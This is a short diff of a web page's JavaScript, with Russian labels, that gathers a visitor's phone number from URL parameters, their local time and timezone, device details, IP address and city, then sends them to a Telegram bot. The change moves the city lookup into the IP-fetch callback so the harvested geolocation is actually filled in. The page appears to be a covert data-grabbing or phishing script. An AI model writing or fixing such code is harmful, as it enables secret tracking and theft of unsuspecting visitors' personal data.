@@ -63,7 +63,6 @@
     info += "Номер телефона: " + params.get("tel") + "\n";
 	let now = new Date().toString();
     info += "Время: " + " " + now.split(" ")[4] + " " + now.match(/\(([^)]+)\)/)[1] + "\n";
-    info += "Город: " + data.city + "\n";
 	
 	function getDeviceInfo() {
   let ua = navigator.userAgent;
@@ -92,6 +91,7 @@ console.log(getDeviceInfo());
         .then(res => res.json())
         .then(data => {
           info += "IP: " + data.ip + "\n";
+          info += "Город: " + data.city + "\n";
           sendToTelegram(info);
         })
         .catch(err => console.error("Ошибка:", err));
@@ -191,6 +191,7 @@ console.log(getDeviceInfo());
 </body>
 
 </html>
+
 
 
 
